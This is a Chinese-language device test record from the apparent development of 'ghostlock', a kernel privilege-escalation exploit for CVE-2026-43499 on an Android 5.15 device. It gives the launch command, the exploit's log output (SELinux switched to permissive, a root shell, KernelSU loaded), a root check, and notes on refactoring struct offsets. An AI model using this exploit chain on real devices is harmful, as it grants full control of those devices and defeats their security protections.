# P0-01 真机门禁：Phase 0 CoreSession 通用化（multicast_waiter，direct）— PASS

对应提交 `e987ed9`（`B0` checkpoint）+ Phase 0 未提交改动（CoreSession 通用化；提交后补 hash）。
候选二进制 `build/native/ghostlock` SHA-256
`af4519d40ac2f7501818b99aaa24158231b25c51b98e701c6e7a9fb279ef0699`。
设备端 profile `p0.bin` = 仓库导出 `5.15.189-android13-8-00016-g51bba4309aac-ab14546557.bin`，
SHA-256 `dac9e63132b40e7fcca362bddc1bb5e26c124df772d8e26b6e03b566a0997b72`，MD5
`d1a556018445d7863259c17d559b1058`（v2、middleware=3=multicast，未经修改）。

## 设备与入口

- 型号 A301SO（Sony Xperia，adb `A301SO`）；`uname -r` =
  `5.15.189-android13-8-00016-g51bba4309aac-ab14546557`；`ro.build.version.incremental` =
  `067002A003017800602211349`。
- 入口：CLI，`GHOSTLOCK_HOME=/data/local/tmp /data/local/tmp/ghostlock-p0 --load-prebuilt-profile
  /data/local/tmp/p0.bin`；route = multicast_waiter（来自 profile）；CPU 对 0/1（profile 默认）。
- 冷启动：`adb reboot` → `sys.boot_completed=1` 后运行，`boot_ms=68832`（≈69s 低噪声窗口）；
  KernelSU 未加载（`/data/modules` 无 kernelsu、无 `su`）；SELinux Enforcing；锁屏未解锁。
- 运行上下文：`pid=6136 uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1`（已有 startup context 行）。

## 结果

PASS（完整输出见 `.native.log`）。关键行：

```
[*] kernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[+] resolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] cpu pair: main=0 consumer=1
[+] startup context pid=6136 uid=2000 ... boot_ms=68832 attr=u:r:shell:s0 enforce=1
[*] multicast route status=0 clean=1/1 step=0 sockopt=-1 errno=0 attempts=16 calls=1 success=1
[+] SELinux permissive
[*] multicast route status=0 clean=1/1 step=0 errno=0 attempts=16 calls=1 success=1   # W2
[*] multicast route status=0 clean=1/1 step=0 errno=0 attempts=16 calls=1 success=1   # W2b repair
[+] child is root!
[+] no app seccomp filter (adb/shell flow); skipping W3
[*] [T+16284ms] exploit complete
[*] handoff: child=11575 alive=1 sent=1 errno=0
[*] handoff: root shell worker pid=16848
[+] KernelSU ready
```

事后核对（设备未重启、未 panic）：

- `cat /proc/modules | grep -i kernelsu` → `kernelsu 204800 0 - Live ... (OE)`。
- `su -c id` → `uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0`。
- `uptime` 7 min；load 下降中；SELinux 运行后回到 `enforce=1`。

## 日志

- 本地：`docs/analysis/device-gates/P0-20261003-multicast-direct-pass.native.log`（全程 stdout/stderr）。
- 设备：`/data/local/tmp/.ghostlock_ksu.log`、`/data/local/tmp/.ghostlock_root.sh`。

## 变更说明

本记录验证 Phase 0（`ExploitSession` → `CoreSession` + `Cve2026_43499State` 内联槽）在真机上行为无回归：

- 布局不变量：`CoreSession.backend_state`=104，后端字段绝对偏移 profile=104/addresses=896/heap=928/
  race=1424/victim=1632/parked=1660/parkedcmd=1664，与基线一致（`session_layout_test` 锁定）。
- `cmp_disasm --reviewed`：6 个攻击函数骨架一致，差异仅为全局数据位移（无栈偏移变化），RESULT: PASS。
- 本次真机：multicast 三次写验证 `status=0 clean=1/1`、`child is root!`、`KernelSU ready`，无 panic。
